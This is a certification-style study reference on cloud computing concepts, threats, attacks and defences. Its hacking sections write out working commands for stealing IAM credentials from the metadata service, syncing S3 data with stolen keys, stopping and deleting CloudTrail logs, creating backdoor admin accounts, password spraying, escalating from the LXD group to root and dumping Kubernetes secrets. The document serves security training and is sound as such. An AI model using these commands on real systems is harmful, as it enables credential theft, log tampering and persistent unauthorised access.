# Module 19 – Cloud Computing

> Status: ✅ Reference complete

## 1. Cloud computing concepts
On-demand delivery of IT resources (storage, servers, apps) over the internet, pay-per-use. Examples: Gmail, Dropbox, Facebook, Salesforce. Major CSPs: Google, Amazon, Microsoft.

### Characteristics
On-demand self-service, distributed storage, rapid elasticity, automated management, broad network access, resource pooling, measured service, virtualization. **Limitations:** limited control, outages, security/privacy/compliance, contracts/lock-ins, network dependence, online attack surface, migration difficulty.

### Service types
- **IaaS** — servers/storage/networking/virtualization (AWS EC2, Azure, Rackspace). *+* dynamic scaling, uptime, ELB, global access; *–* software security risk, performance.
- **PaaS** — build/deploy environment (Google App Engine, Azure, Salesforce). *+* simplified deploy, prebuilt functionality, scalability; *–* vendor lock-in, data privacy.
- **SaaS** — application software over internet (Google Docs, Salesforce). *+* low cost, global access; *–* security/latency, internet dependency.
- **IDaaS** — identity & access management (SSO, MFA, governance) — Okta, Azure AD, OneLogin.
- **SECaaS** — security tools as a service (pentest, IDS, anti-malware, SIEM) — eSentire, Foundstone.
- **CaaS** — container engines/clusters/management (AWS EC2, GKE); combines IaaS+PaaS.
- **FaaS** — serverless functions (AWS Lambda, Google/Azure Functions, Oracle Functions).
- **XaaS** — anything-as-a-service (NaaS, STaaS, TaaS, MaaS, DRaaS).
- **FWaaS** — cloud firewall (Zscaler, Fortinet, Cisco).
- **DaaS** — virtual desktops (Amazon WorkSpaces, Azure Virtual Desktop).
- **MBaaS** — mobile backend (Firebase, AWS Amplify, CloudKit).
- **MaaS/EaaS** — Machines/Equipment-as-a-Service (manufacturers lease machines for revenue share).

### Shared responsibility
Separation of duties prevents conflict of interest, fraud, abuse, error. Responsibility split varies by IaaS/PaaS/SaaS. Example: IaaS provider does initial privileged-user account management; consumer controls user account management for deployed apps.

### Deployment models
- **Public** — provider delivers over internet to anyone (AWS EC2, Azure, GCP). *+* simple, low cost, no maintenance; *–* security not guaranteed, no control, slow.
- **Private** — single org behind its own firewall (VMware vRealize, SAP Cloud). *+* security, control, performance, compliance (SOX/PCI/HIPAA); *–* high cost, on-site maintenance.
- **Community** — shared by orgs with similar needs (healthcare/government). *+* cheaper than private, compliance; *–* resource competition, moderate security.
- **Hybrid** — private + public + community (critical on private, non-critical on public). *+* scalability + security; *–* network conflicts, compliance difficulty, complex SLAs.
- **Multi-cloud** — services from multiple providers (Azure Arc, Google Anthos). *+* reliability, low vendor lock-in; *–* large attack surface, overhead.
- **Distributed cloud** — centralized control plane across locations (edge computing; Google Distributed Cloud). **Poly cloud** — combine specific services from multiple providers.

### NIST reference architecture (5 actors)
- **Cloud Consumer** — uses services, signs SLAs, pays by usage.
- **Cloud Provider** — owns/manages infrastructure.
- **Cloud Carrier** — intermediary providing connectivity/transport.
- **Cloud Auditor** — independently examines controls (security/privacy/performance).
- **Cloud Broker** — manages services for consumers: *service intermediation* (adds features), *aggregation* (combines services), *arbitrage* (picks best from providers).

### Storage architecture & related computing
Cloud storage layers: **front-end** (user access/APIs), **middleware** (replication, de-duplication), **back-end** (physical hardware). Examples: S3, Azure Storage, OpenStack Swift.
- **Fog computing** — intermediary layer between IoT and cloud (fog nodes at the edge); low latency, bandwidth savings, works with unstable internet. *–* extra edge-device cost, complexity, limited scalability.
- **Edge computing** — process data on/near the generating device; reduces latency/bandwidth.
- **Cloud vs Fog vs Edge:** cloud = centralized/high latency; fog = distributed nodes/low latency; edge = on-device/low latency, customized security.
- **Cloud vs Grid computing:** cloud = client-server, centralized, pay-as-you-go, IaaS/PaaS/SaaS; grid = distributed, collaborative, interoperable, free usage.

CSPs: AWS, Microsoft Azure, Google Cloud Platform, IBM Cloud.

## 2. Container technology
A **container** is a lightweight package bundling an app + dependencies (libraries, binaries, config) so it runs consistently anywhere. Delivered via **CaaS** platforms with orchestrators (Kubernetes/Docker). Features: portability/consistency, isolation/security, efficiency (shared OS kernel, no separate OS), scalability, robustness (seconds to deploy).

### Architecture (5 tiers) & lifecycle (3 phases)
Tiers: **1** developer machines (image creation), **2** testing/accreditation (validate + sign images), **3** registries (store/disseminate images), **4** orchestrators (images→containers, deploy to hosts), **5** hosts (run containers). Phases: **image creation/testing/accreditation** → **image storage/retrieval** (registries: Docker Hub public, Amazon ECR/Docker Trusted Registry private) → **container deployment/management** (orchestrators: Kubernetes, Docker Swarm, Nomad, Mesos).

### Containers vs VMs
| Virtual Machines | Containers |
|-----------------|-----------|
| Heavyweight | Lightweight, portable |
| Independent OS per VM | Share one host OS |
| Hardware virtualization | OS-based virtualization |
| Slower provisioning | Real-time provisioning |
| Fully isolated (more secure) | Process-level isolation (partial) |
| Launched in minutes | Launched in seconds |

### Docker
Open-source OS-level virtualization delivering containerized packages (PaaS). **Docker Engine** (client/server): server (daemon `dockerd`), REST API, Client CLI. **Docker Swarm** — manage multiple engines (create swarm, deploy, scale, health check, failover). **Architecture:** Docker daemon (processes API, manages objects), Docker client (primary interface), registries (Docker Hub/Cloud), objects (**images** read-only templates, **containers** runnable instances, **services** scale across daemons, **networking**, **volumes** persistent storage).
- **Operations:** build from Dockerfile, list/tag images, pull/push, search.
- **Networking (CNM):** **sandbox** (network settings), **endpoint** (connection point), **network** (group of endpoints); driver interfaces: **network drivers** + **IPAM drivers**. Native drivers: Host, Bridge, Overlay, MACVLAN, None. Remote: Contiv (Cisco), Weave, Kuryr (OpenStack Neutron).

### Container orchestration
Automates container lifecycle: provisioning/deployment, failover/redundancy, load distribution, host migration, resource allocation, service exposure, load balancing/routing/service discovery, health checks, availability, secure communication.

### Kubernetes (K8s)
Open-source orchestration (Google) for containerized apps. Features: service discovery (DNS/IP), load balancing, storage orchestration, automated rollouts/rollbacks, automatic bin packing, self-healing, secret/config management.
- **Cluster architecture:** ≥1 master + ≥1 worker node (worker runs **pods**). **Master components:** kube-apiserver (front-end, only talks to etcd), etcd cluster (key-value store), kube-scheduler (assigns nodes to pods), kube-controller-manager (runs controllers), cloud-controller-manager. **Node components:** kubelet (ensures containers in a pod are healthy), kube-proxy (network rules), container runtime (Docker/containerd/cri-o/rktlet).
- **Clusters:** connected nodes running in parallel; types — **HA/failover**, **load balancing**, **HPC**.

### Container security challenges
Vulnerable source code, large attack surface, lack of visibility, compromised secrets, DevOps speed, noisy neighbors (DoS), **container breakout to host** (root container escapes), network-based attacks, bypassing isolation, ecosystem complexity, misconfigurations, isolation breakdowns, insecure communication, insufficient logging, patch management, persistent storage, orchestration security, **kernel exploits** (shared kernel), cgroups misconfiguration, pod security policies, compliance audit risks. Management platforms: Portainer, Apache Mesos, Amazon ECS, Azure ACI, Red Hat OpenShift. K8s platforms: Mirantis MKE, GKE, Amazon EKS, IBM Cloud Kubernetes.

## 3. Serverless computing
**FaaS** — run code without managing servers; provider handles provisioning/scaling/load balancing/security/patching. *+* scalability, faster deploy, reduced cost, no server management, pay-per-use, low failure risk; *–* increased vulnerability, vendor lock-in, statelessness, complex testing, unsuitable for long-running processes.

**Serverless vs containers:** developer only uploads code (vs defines container config); function auto-destroyed after execution; charged only for resources consumed; timeout enforced; no temp storage (uses object storage); only for microservices; language restricted by CSP. Frameworks: Azure Functions, AWS Lambda, Google Cloud Functions, Serverless Framework, AWS Fargate, Alibaba Function Compute.

## 4. Cloud computing threats

### OWASP Top 10 Cloud Security Risks
R1 Accountability & Data Ownership, R2 User Identity Federation, R3 Regulatory Compliance, R4 Business Continuity & Resiliency, R5 User Privacy & Secondary Data Usage, R6 Service & Data Integration (data in transit), R7 Multi-Tenancy & Physical Security, R8 Incidence Analysis & Forensic Support (distributed logs), R9 Infrastructure Security (misconfiguration), R10 Non-Production Environment Exposure.

### OWASP Top 10 Kubernetes Risks
K01 Insecure Workload Configurations, K02 Supply Chain Vulnerabilities, K03 Overly Permissive RBAC, K04 Lack of Centralized Policy Enforcement (→ OPA), K05 Inadequate Logging/Monitoring, K06 Broken Authentication, K07 Missing Network Segmentation Controls, K08 Secrets Management Failures, K09 Misconfigured Cluster Components (API server/etcd/kubelet), K10 Outdated/Vulnerable Components.

### OWASP Top 10 Serverless Risks
A1 Injection (events from S3/Kinesis/DynamoDB/email — firewall can't filter), A2 Broken Authentication (stateless, spoofed-email triggers), A3 Sensitive Data Exposure (S3/DynamoDB, /tmp), A4 XXE, A5 Broken Access Control (over-privileged functions), A6 Security Misconfiguration (long timeout + low concurrency → DoS), A7 XSS (from email/logs/storage/IoT), A8 Insecure Deserialization (Python/NodeJS/JSON), A9 Components with Known Vulnerabilities, A10 Insufficient Logging/Monitoring.

### Cloud threats (with key countermeasures)
- **Data breach/loss** — flaw in one client app reaches another's data. CM: encrypt at rest + in transit, strong key management, MFA, backups, DLP, CASB, micro-segmentation, perimeter firewall.
- **Loss of operational/security logs** — CM: monitor logs, safe log management, restrict log access.
- **Malicious insiders** — CM: supply-chain management, HR legal contracts, breach notification.
- **Illegal access** — CM: robust IS policy, client audit of CSP policies.
- **Loss of reputation (co-tenant activity)** — CM: reputable CSP, verify isolation, segregate tenant functions.
- **Loss of encryption keys** — CM: don't store keys with data, AES/RSA, restrict key stores, backup/recovery, no key reuse, HSM.
- **Theft of equipment** — CM: physical security (guards/CCTV/biometrics), rack-mounted servers, off-site backups.
- **Loss/modification of backup data** — CM: data restoration tools, **3-2-1 model**.
- **Improper data handling/disposal** — CM: VPNs, encryption, data storage period, sanitization, audit trail.
- **Abuse/nefarious use** — anonymous access for cracking, rainbow tables, botnet C2, DDoS. CM: robust registration, traffic monitoring, blacklists, per-tenant firewalls.
- **Malicious probes/scans** — CM: firewalls/IDS, separate hypervisor/VM networks, VLAN, block ping/traceroute.
- **Insecure interfaces/APIs** — CM: analyze security model, secure auth, encrypt in transit, OCCI/CIMI frameworks, never reuse API keys.
- **Insufficient due diligence**, **shared technology issues** (hypervisor flaws → per-tenant firewalls), **unknown risk profile**, **unsynchronized clocks** (NTP), **inadequate infrastructure design**, **client hardening conflicts**, **CSP acquisition**, **network management failure**, **loss of governance**, **compliance risks**.
- **EDoS (Economic Denial of Sustainability)** — abuse pay-as-you-use billing to inflate costs. CM: reactive in-cloud scrubber service (client-puzzle).
- **Limited cloud usage visibility** — CM: cloud-native monitoring, audits, MFA, CSPM.
- **Natural disasters, hardware failure, supply-chain failure** (blockchain/zero-trust validation), **isolation failure**, **service termination**, **weak control plane** (MFA + RBAC + API security).
- **Network:** modifying network traffic, management interface compromise (VLAN + jump servers), authentication attacks (strong passwords + 2FA + IP whitelisting + IAM), **VM-level attacks** (hypervisor flaws → IDS/IPS, HAP), **account hijacking** (least privilege, IAM, MFA, tokenization).
- **Governance/legal:** lock-in (standardized API, multi-cloud, exit strategy), licensing risks, jurisdiction changes, subpoena/e-discovery.
- **Development:** privilege escalation (privilege separation, IAM audits), insecure software development (SDLC), resource exhaustion (auto-scaling + rate limiting), lack of security architecture.

### Container & Kubernetes vulnerabilities
Container: impetuous image creation, insecure image configs, unreliable third-party resources, unauthorized access, insecure runtime configs, data exposure in Dockerfiles, embedded malware, non-updated images, hijacked repository/registry, exposed services via open ports, exploited applications, mixing workload sensitivity levels.
Kubernetes: no certificate revocation, unauthenticated HTTPS connections, exposed bearer tokens in logs, sensitive data via environment variables, secrets at rest not encrypted by default, non-constant-time password comparison, hardcoded credential paths, non-atomic log rotation, no back-off process for scheduling, no non-repudiation.

## 5. Cloud attacks
- **Service hijacking via social engineering** — fake login page → steal credentials. CM: no shared creds, MFA, SE training, encrypt, least privilege.
- **Service hijacking via network sniffing** — Wireshark captures unencrypted creds/cookies/UDDI/SOAP/WSDL. CM: encrypt over network + in config files, detect promiscuous NICs, SSL/TLS.
- **Side-channel / cross-guest VM breach** — malicious VM on same host observes CPU cache timing/power to infer keys. CM: virtual firewall, random encryption, lockdown images, consistent resource access coding.
- **Wrapping attack** — duplicate the SOAP body during TLS translation, send as legit user. CM: XML schema validation, authenticated encryption, WS-SecurityPolicy "SignedParts", CryptoCoverageChecker.
- **Man-in-the-Cloud (MITC)** — abuse file-sync services (Drive/Dropbox) via synchronization tokens. CM: email security gateway, token-expiration policies, CASB, 2FA, encrypt + external keys.
- **Cloud Hopper** — compromise MSPs (spear-phish + PowerSploit + fileless malware) to reach customers. CM: MFA, customer-CSP coordination, data categorization, jump servers.
- **Cloud cryptojacking** — inject JS miner (CoinHive/Cryptoloot) into pages/libraries. CM: strong passwords, patch, SSH keys, CoinBlocker blacklist, DOM/JS monitoring, watch for price surges, terminate idle instances.
- **Cloudborne** — backdoor in bare-metal server firmware (BMC/IPMI) survives tenant reassignment. CM: keep firmware updated, sanitize/reflash before reassignment, validate for implants.
- **IMDS attack** — query Instance Metadata Service (169.254.169.254) to steal short-lived role credentials. CM: use IMDSv2, disable IMDS when unused, least-privilege roles.
- **CPDoS / CDN cache poisoning** — malformed request → origin error cached + served to all users. CM: don't cache HTTP error pages, WAF, monitor cache.
- **Cloud Snooper** — weak AWS security groups + rootkit/backdoor; C2 disguised as web traffic (ports 80/443 → rootkit rewrites to ports 1010/2020/...). CM: analyze traffic, patch, layered security.
- **Golden SAML** — steal ADFS token-signing certificate → forge SAML assertions. CM: monitor user activity, MFA, least privilege, update certificates.
- **Living Off the Cloud (LotC)** — abuse SaaS/IaaS apps (CMD/PowerShell/Certutil, Dropbox/Drive, Ngrok C2). CM: zero trust, corporate-only Dropbox, logging, ML analytics, app whitelisting, segmentation, MFA, RBAC.
- **Other:** session hijacking via XSS, session riding (CSRF-style), DNS attacks (poisoning/cybersquatting/domain hijacking/sniping → DNSSEC), SQL injection, cryptanalysis (weak RNG/algorithms), DoS/DDoS, man-in-the-browser, metadata spoofing (WSDL tampering), cloud malware injection (malicious SaaS/PaaS/IaaS instance), multi-cloud attack, privilege escalation via CSR API (Kubernetes), privilege escalation abusing elevation control (AWS PassRole, GCP iam.serviceAccountUser). Cloud malware: Cuttlefish (zero-click router malware), Denonia, LemonDuck, RansomCloud.

## 6. Cloud hacking methodology
**Phases:** Information Gathering → Vulnerability Assessment → Exploitation → Post-Exploitation. Elements targeted: web application (API) hacking, system hacking (VMs/containers/serverless), cloud hacking (misconfig/open ports/weak passwords). **Note:** notify the CSP before hacking; check permitted activities (AWS/Azure/GCP have specific rules).

### Identifying target cloud (Shodan filters)
```
port:443                              # HTTPS services
ssl.cert.issuer.cn:Amazon             # AWS-issued SSL certs
cloud.region:<Region_code>            # cloud region
org:Microsoft                         # Microsoft/Azure devices
product:Kubernetes                    # Kubernetes instances
org:Amazon                            # Amazon-hosted services
ssl.cert.subject.cn:azure             # Azure-hosted services
tag:cloud                             # cloud assets (enterprise)
net:52.0.0.0/8                        # AWS IP range
http.html:"s3.amazonaws.com"          # AWS S3 buckets
```

### Discovery & scanning
- **Masscan** (fast port scan):
  ```bash
  sudo masscan -p0-65535 <target_IP> --rate=<rate>
  sudo masscan -p0-65535 <target_IP> --rate=<rate> -oX scan_results.xml   # or -oJ scan_results.json
  ```
- **Prowler** (240+ controls: CIS/NIST/PCI-DSS/GDPR/HIPAA):
  ```bash
  prowler <provider>
  prowler <provider> -M csv json-asff json-ocsf html
  prowler azure --checks storage_blob_public_access_level_is_disabled
  prowler aws --services s3 ec2
  prowler aws --profile custom-profile --filter-region <region_1> <region_2>
  prowler gcp --project-ids <Project_ID_1> <Project_ID_2>
  ```
- **CloudSploit** (misconfigurations; AWS/Azure/GCP config files):
  ```bash
  ./index.js                           # standard scan
  ./index.js --compliance=hipaa        # (or pci / cis)
  ./index.js --csv=file.csv --console=table
  ```
- **Cleanup/stealth:** log manipulation, removing credentials/access, manipulating configs (disable alerts), persistence mechanisms (legitimate tools/scripts).

## 7. AWS hacking

### Enumerating S3 buckets
Techniques: inspect HTML, brute-force URL (`http://s3.amazonaws.com/[bucket_name]`, Burp Intruder), Google dorks (`inurl:s3.amazonaws.com`, `site:s3.amazonaws.com inurl:facebook`).
```bash
s3scanner -bucket <name>                          # single bucket
s3scanner -bucket-file names.txt -enumerate       # from file
python bucketloot.py -l <file>                    # publicly accessible
python bucketloot.py -c <file>                    # check permissions
./cloudbrute -d <target.com> -k <keyword> -t 80 -T 10 -w <wordlist>.txt
```

### Enumerating EC2 / RDS / accounts / roles
```bash
aws ec2 describe-instances
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData --output text --query "UserData.Value" | base64 --decode
aws ec2 describe-volumes ; aws ec2 describe-snapshots ; aws ec2 describe-security-groups
aws ec2 describe-key-pairs ; aws ec2 describe-vpcs ; aws ec2 describe-subnets
aws rds describe-db-instances ; aws rds describe-db-snapshots --include-public --snapshot-type public
```
- **Account IDs** — from publicly shared resources, ARNs, IAM policies.
- **IAM roles** — enumerate via error messages (assume-role attempts). Tools: Principal Mapper (PMapper) graphs IAM, Cloudsplaining (`aws iam get-account-authorization-details --output json > a.json` → `cloudsplaining scan --input-file a.json --output ./report`).
- **AWS Cognito** — `aws cognito-idp list-user-pools`, `aws cognito-identity list-identity-pools`, `aws cognito-idp sign-up ...` (check existing users).
- **DNS (Route 53)** — Ghostbuster: `ghostbuster scan aws --profile <profile>`.
- **Serverless** — `aws lambda list-functions`, `aws lambda list-function-url-configs --function-name <f>`, `aws dynamodb list-tables`, `aws apigateway get-rest-apis`.

### Attack-path discovery & threat emulation
- **Cartography** (Neo4j graph): `MATCH (instance:EC2Instance{exposed_internet: true}) RETURN instance.instanceid` etc.
- **CloudFox**: `cloudfox aws --profile <p> all-checks` (access-keys, buckets, endpoints, permissions, secrets, workloads).
- **Security groups exposed** — `aws ec2 describe-security-groups --filter Name=ip-permission.cidr,Values=0.0.0.0/0,::/0` (check FromPort/ToPort).
- **Stratus Red Team** (MITRE ATT&CK emulation): `stratus list --platform AWS --mitre-attack-tactic persistence`, `stratus warmup/detonate/cleanup <technique>`.

### Exploitation
- **IMDS cloud-key theft:**
  ```bash
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role>
  # IMDSv2:
  TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
  curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
  ```
- **Misconfigured S3 exploit:** `aws s3 ls s3://[bucket] --no-sign-request`; mv/cp/rm files with `--no-sign-request`.
- **Compromise IAM credentials** — repository misconfigs (keys in Git), social engineering, password reuse, SSRF (query EC2 metadata), reading local files, third-party software, insider threat.
- **Pacu** (AWS exploitation framework) — hijack misconfigured IAM roles (`AWS":"*"`): `assume_role_enum.py -p PROFILE -w WORD_LIST -I ACCOUNT_ID`.
- **DumpsterDiver** — scan for hardcoded keys: `dumpsterDiver -p /path -e AWS_KEY` (pattern `AKIA` + 16 chars).
- **CCAT** (Docker containers on ECS/ECR) — Enumerate ECR → Pull image → Docker Backdoor (reverse shell) → Push to ECR.
- **Shadow admins** — abuse `Microsoft.Authorization/elevateAccess/Action`, `roleDefinitions/write`, `roleAssignments/write`. Tools: SkyArk (AWStealth/AzureStealth), Red-Shadow.
- **SSRF → IAM credentials → S3:** `aws sts get-caller-identity --profile stolen`, `aws s3 ls --profile stolen`, `aws s3 sync s3://bucket /local --profile stolen`.
- **AWS Lambda** — black-box (misconfigured S3 → tag calculation via Lambda → exfil credentials) / white-box (phishing → list functions → download Lambda code).

### IAM privilege escalation
Create new policy version (`iam:CreatePolicyVersion --set-as-default`), set default policy version (`iam:SetDefaultPolicyVersion`), create EC2 with instance profile (`iam:PassRole`+`ec2:RunInstances`), create access key (`iam:CreateAccessKey`), create/update login profile, attach policy (`iam:AttachUserPolicy`/Group/Role), create inline policy (`iam:PutUserPolicy`/Group/Role), add user to group (`iam:AddUserToGroup`).

### Persistence & covering tracks
- **Backdoor accounts** — Endgame (`endgame expose --service iam --name test`), Pacu.
- **CloudTrail manipulation:**
  ```bash
  aws CloudTrail stop-logging --name <trail> --profile administrator
  aws CloudTrail start-logging --name <trail> --profile administrator
  aws CloudTrail delete-trail --name <trail> --profile administrator
  aws s3 rb s3://<bucket> --force --profile administrator
  ```
- **EC2 persistence** — backdoor IAM users (`aws iam create-user` + `attach-user-policy AdministratorAccess`), alter startup scripts (`/etc/rc.local`), SSH key injection (`~/.ssh/authorized_keys`), rootkits, leverage IAM roles.
- **Lateral movement** — `aws sts assume-role --role-arn arn:aws:iam::<target>:role/<name> --role-session-name <s>` → set env credentials → `aws ec2 describe-regions`.
- **AWSGoat** (vulnerable AWS lab): SQLi, ECS breakout + metadata, SSRF, IAM privesc, file upload + task metadata.

## 8. Microsoft Azure hacking
- **AADInternals** (recon): `Invoke-AADIntReconAsOutsider -Domain <d>`, `Get-AADIntLoginInformation -Domain <d>`, `Get-AADIntTenantDomains -Domain <d>`, `Get-AADIntTenantID`, `Invoke-AADIntReconAsInsider`.
- **MicroBurst** (enumerate services): `Get-AzDomainInfo -Verbose -Folder microburst-output`.
- **Azure AD enumeration** — AzureGraph: `gr$list_users()`, `me$list_group_memberships()`.
- **Password spraying** — Spray365: `python spray365.py generate normal -ep <plan> -d <domain> -u <users> -pf <passwords>`, `spray365.py spray -ep <plan>`.
- **Stormspotter** (attack surface map): `python3 sscollector.pyz cli` / `spn -t <tenant> -c <clientID> -s <secret>`.
- **AzureHound** (→ BloodHound): `azure-hound list -u <user> -p <pass> -t <tenant> -o mytenant.json`.
- **Goblob** (public blob storage): `./goblob <storageaccount>`, `./goblob -accounts accounts.txt`.
- **NSG enumeration** — `az network nsg rule list --resource-group <rg> --nsg-name <nsg> --query "[?direction=='Inbound' && sourceAddressPrefix=='*']"`.
- **Managed identities & Functions** — `curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER` → `Connect-AzAccount -AccessToken <t> -AccountId <id>` → `Get-AzResource` → `Get-AzStorageAccountKey`.
- **Privilege escalation** (misconfigured accounts) — create key credential, upload self-signed cert, `Add-AzureADDirectoryRoleMember` to Global Administrator.
- **Backdoors** — service principals: `az ad sp create-for-rbac --name <n>`, `az role assignment create --assignee <id> --role "Owner"`, rotate credentials.
- **VNet peering** — `az network vnet peering create ... --allow-vnet-access`, enable traffic forwarding / remote gateways / gateway transit.
- **AzureGoat** (vulnerable lab): IDOR, SSRF, security misconfiguration, privilege escalation.

## 9. Google Cloud hacking
- **Enumeration (gcloud/gsutil):**
  ```bash
  gcloud organizations list
  gcloud projects list
  gsutil ls ; gsutil iam get gs://<bucket> ; gsutil ls gs://<bucket>
  gcloud iam service-accounts list
  gcloud auth print-access-token --impersonate-service-account=<sa-email>
  gcloud compute instances list ; gcloud compute instances describe <i> --zone <z>
  gcloud sql instances list ; gcloud sql databases list --instance=<i>
  gcloud iam roles list ; gcloud projects get-iam-policy <project>
  ```
- **Tools:** gcp_service_enum (`gcp_enum_services.py -f <key> --output-file <out>`), GCP Scanner (`scanner.py -o <out> -g <profile>`), cloud_enum (`cloud_enum.py -k <keyword> --disable-aws --disable-azure`), GCP Privilege Escalation Scanner (`enumerate_member_permissions.py` → `check_for_privesc.py`), GCPBucketBrute (bucket ACL privesc via `TestIamPermissions`).
- **Backdoors** — `gcloud iam roles create <ROLE> --project=<p> --file=role-definition.yaml`, `gcloud projects add-iam-policy-binding <p> --member=serviceAccount:<sa> --role=roles/<ROLE>`.
- **GCPGoat** (vulnerable lab): SSRF, misconfigured storage buckets, lateral movement.

## 10. Container hacking
- **Information gathering (kubectl):** `kubectl get pods`, `kubectl describe pod <p>`, `kubectl logs <p>`, `kubectl get services`, `kubectl get deployment`, `kubectl get serviceaccounts`.
- **Enumerate registries:** `docker login <registry>`, `curl -u <u>:<p> https://<registry>/v2/_catalog`, `.../v2/<image>/tags/list`.
- **Vulnerability scanning** — Trivy (`trivy <target> --scanners <s> <subject>`), Sysdig, Kubescape, kube-hunter, kubeaudit, KubiScan.
- **Docker remote API exploit:**
  ```bash
  docker -H <IP:Port> pull alpine
  docker -H <IP:Port> run -t -d alpine
  docker -H <IP:Port> exec <container> ls           # retrieve host files (mount /etc)
  docker -H <host> run --network=host --rm marsmensch/nmap -ox <IP Range>   # scan internal network
  docker -H <host> inspect <container> ; docker -H <host> exec -i <container> env   # retrieve credentials
  docker -H <host> exec -i some-mysql mysql -u root -p <pwd> -e "show databases"    # query DBs
  ```
- **Hacking container volumes** — access master nodes (iSCSI secrets via API/etcd), access nodes (kubelet; `df` for NFS config), access container (hostpath volume type).
- **LXD/LXC group privilege escalation** (user in `lxd` group → root):
  ```bash
  lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
  lxc start privesc ; lxc exec privesc /bin/sh
  ```
- **Kubernetes etcd post-enumeration** (port 2379 = root-level access):
  ```bash
  ps -ef | grep apiserver     # locate etcd server + PKI
  ETCDCTL_API=3 ./etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=... --key=... --endpoints=https://127.0.0.1:2379 get /registry/ --prefix | grep -a '/registry/secrets/'
  ```

## 11. Cloud security

### Control layers & shared responsibility
Layers: Application (OWASP, WAF), Information (encryption, DLP), Management (IAM, patch, compliance), Network (firewalls, IDS/IPS, DDoS, OAuth/DNSSEC), Trusted Computing, Computation/Storage, Physical. Shared responsibility: provider secures infrastructure; consumer secures data/config/access (varies by IaaS/PaaS/SaaS). Controls: PKI, SDL, WAF, FW, IAM, ENC, DLP, IPS, SWG, VA/VM, AV, VPN, LB, GRC, TPM, DDoS, Netflow.

### Considerations & control placement
Considerations: tailor-made security, secure multi-tenancy, DR plan, continuous monitoring, data integrity, strong encryption, load balancing, physical security, CASB, zero-trust, IAM, RBAC, compliance (GDPR/ISO/HIPAA). Control categories: **deterrent** (warning signs), **preventive** (strong auth), **detective** (IDS/IPS), **corrective** (restore backups).

### Attack-surface assessment — Scout Suite
```bash
scout aws --profile <profile>
scout azure --tenant-id <t> --subscription-id <s> --client-id <c> --client-secret <cs>
scout gcp --service-account-file <key>.json
```

### Best practices
- **General:** data protection/backup, MFA + RBAC, patching, network monitoring (firewall/IDS/IPS), secure API management, compliance/auditing (SSAE 18), encryption + key management, physical security, incident response, employee awareness.
- **AWS:** categorize identity, temporary credentials, rotate credentials, least privilege, MFA, IAM Access Analyzer, Trusted Advisor, segregate assets; infrastructure (ISMS, network segmentation, LB/CDN/WAF, Security Hub, DLP, Amazon Inspector); CloudTrail + CloudWatch; AWS Organizations + SCPs; GuardDuty; VPC Flow Logs; immutable backup storage.
- **Azure:** MFA, RBAC, Microsoft Defender for Cloud + Sentinel, conditional access, DDoS protection, Key Vault + encryption, restrict admin ports, Just-in-Time VM access, Azure Firewall.
- **GCP:** STRIDE threat modeling, KMS/CSEK encryption, shielded VMs, GKE node encryption, SSO + strong access controls, secure Cloud SQL (SSL), private network access, disable serial console + public buckets, Cloud Logging + Security Command Center, sandbox + vuln checks.
- **NIST** — risk assessment, deployment model selection, audit procedures, renew SLAs, incident detection, encrypt at rest + in transit; access-control recommendation tables for IaaS/PaaS/SaaS.

### SAML
Open-standard auth/authz providing SSO. Entities: **client/user**, **service provider (SP)**, **identity provider (IdP)**. Flow: trust relationship built between SP+IdP → user request → SP sends SAML request to IdP → IdP creates XML authentication/attribute/authorization assertions → forwarded to SP → access granted.

### Cloud network security
- **VPC** — private isolated network in a public cloud; subnets, IPv6, data separation.
- **Public/private subnets** — public via Internet Gateway (IGW); private outbound-only via NAT gateway.
- **Transit gateways** — central hub connecting on-prem + multiple VPCs.
- **VPC endpoints** — private internal link to cloud services (no internet/NAT/VPN): **interface endpoint** (ENI with private IP), **gateway-load-balancer endpoint** (security inspection).
- **Cloud security controls** — cloud application security (XSS/CSRF/session hijacking/SQLi/weak auth protection), high availability across zones, cloud integration/auditing, security groups (inbound/outbound traffic control, anti-DoS), instance awareness.

### Vulnerability solutions
- **Kubernetes:** certificate revocation (CRL/OCSP stapling), authenticate HTTPS (two-way TLS, kube-apiserver CA), remove bearer tokens from logs, use K8s secrets (not env vars), encrypt secrets at rest, constant-time comparison (`crypto.subtle.ConstantTimeCompare`), config method for credential paths, copy-then-rename log rotation, back-off process for kube-scheduler, secondary logging for non-repudiation.
- **Serverless (OWASP A1–A10):** don't trust input + parameterized interfaces + least privilege + runtime defense (injection); CSP IAM (AWS Cognito/SSO, Azure AD B2C) + Federated Identity (broken auth); classify + encrypt + HTTPS (sensitive data); CSP SDKs + disable entity resolution (XXE); least privilege + review functions (broken access); Trusted Advisor + minimum timeout (misconfiguration); encode untrusted data (XSS); validate serialized objects (deserialization); monitor third-party libs + OWASP Dependency Check (known vulns); CSP monitoring (CloudTrail/Azure Monitor) for logging.

### Best practices (container/Docker/K8s/serverless)
- **Container:** monitor CVEs, minimal base images, non-root user, authenticate registry access, image scanning, logging/auditing, immutable containers, SELinux/AppArmor, harden host, external secrets.
- **Docker:** don't expose daemon, trusted images only, non-root, `--cap-drop`, `--security-opt=no-new-privileges` + AppArmor/SELinux/seccomp, `--icc=false`, resource limits, `--read-only` + Docker secrets, Docker Content Trust (DCT), HTTPS/TLS.
- **Kubernetes:** validate files/paths, no hardcoded credentials, secure logging, safe JSON handling, authenticate HTTPS by default, encrypt secrets (avoid AES-GCM/ECB), network policies, monitor (Prometheus/Grafana/ELK), OPA/Kyverno policy enforcement, keep updated.
- **Serverless:** minimize permissions, monitor for attacks, patch dependencies, sanitize inputs, Snyk scanning, least privilege, TLS/HTTPS, secret storage, limit runtime, secure triggers.

### Zero trust, checklists & solutions
